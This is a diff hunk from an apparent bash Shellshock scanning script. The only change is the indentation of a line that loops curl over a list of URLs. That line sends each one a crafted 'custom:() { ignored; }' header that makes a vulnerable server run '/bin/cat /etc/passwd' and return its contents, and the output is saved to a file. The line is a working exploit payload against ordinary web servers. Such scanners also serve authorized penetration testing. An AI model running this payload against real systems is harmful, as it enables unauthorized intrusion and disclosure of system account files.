@@ -33,7 +33,7 @@ do
 				echo "To test a list of URLs one needs to be supplied via the 'List' option"
 				printf "%b \n"
 			else
-				cat $list | xargs -I % bash -c 'curl % -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" && echo ----END OF RESPONSE----' | tee $outfile
+                cat $list | xargs -I % bash -c 'curl % -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" && echo ----END OF RESPONSE----' | tee $outfile
 				printf "%b \a\n\n
 				
 Done, exiting.\n"
